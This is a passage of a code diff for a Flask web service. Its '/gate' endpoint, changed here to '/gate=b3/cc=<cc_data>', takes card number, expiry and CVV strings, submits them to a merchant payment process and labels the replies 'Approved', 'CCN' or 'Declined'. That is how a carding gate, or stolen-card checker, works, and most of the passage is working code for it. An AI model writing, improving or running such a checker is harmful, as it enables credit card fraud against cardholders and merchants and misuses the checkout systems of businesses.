+        err = soup.find('div', class_='woocommerce-notices-wrapper')
+        message = err.get_text(strip=True) if err else "Unknown error"
+        rr = re.findall(r"Reason:\s*([^<\n\r]+)", ree.text)
+        
+        # Determine status based on response
+        status = "Declined"
+        for pattern in approved_patterns:
+            if pattern in message or (rr and pattern in rr[0]):
+                status = "Approved"
+                break
+                
+        for pattern in CCN_patterns:
+            if pattern in message or (rr and pattern in rr[0]):
+                status = "CCN"
+                break
+        
+        return {
+            'status': status,
+            'response': message if message else rr[0] if rr else "Unknown error"
+        }
+        
+    except Exception as e:
+        return {
+            'status': 'Error',
+            'response': str(e)
+        }
 
-
-@app.route('/gate')
-def gate():
-    # Get the card details from the 'stauth' query parameter
-    card_details_str = request.args.get('stauth')
-
-    if not card_details_str:
-        return jsonify({"status": "declined", "response": "Your card was declined."})
-
-    # Parse the input: card number|exp_month|exp_year|cvc
-    parts = card_details_str.split('|')
-    if len(parts) < 4:
-        return jsonify({"status": "declined", "response": "Your card was declined."})
-
-    card_number = parts[0].replace(' ', '')
-    exp_month = parts[1]
-    exp_year = parts[2]
-    cvc = parts[3]
-
-    # Handle 2-digit year (e.g., '25' -> '2025')
-    if len(exp_year) == 2:
-        exp_year = '20' + exp_year
-
-    # Hardcoded defaults as requested
-    postal_code = "10001"
-    country = "US"
-
-    card_details = {
-        'card_number': card_number,
-        'exp_month': exp_month,
-        'exp_year': exp_year,
-        'cvc': cvc,
-        'postal_code': postal_code,
-        'country': country
-    }
-
-    # Process the payment and return the result
-    result = process_payment(card_details)
+@app.route('/gate=b3/cc=<cc_data>')
+def gate_b3(cc_data):
+    # Parse the credit card data
+    pattern = r'^(\d{13,19})\|([0-1]\d)\|(\d{2}|\d{4})\|(\d{3,4})$'
+    match = re.match(pattern, cc_data)
+    
+    if not match:
+        return jsonify({
+            'status': 'Error',
+            'response': 'Invalid card format. Expected: cardnumber|mm|yy|cvv'
+        })
+    
+    cc, mm, yy, cvv = match.groups()
+    
+    # Process the payment
+    result = process_payment(cc, mm, yy, cvv)
+    
     return jsonify(result)
 
-
 if __name__ == '__main__':
-    # Running on 0.0.0.0 makes it accessible from your local network and the internet
-    # Use a non-standard port like 8080 if 5000 is blocked
-    app.run(host='0.0.0.0', port=8080, debug=True)
+    app.run(debug=True, host='0.0.0.0', port=5000)
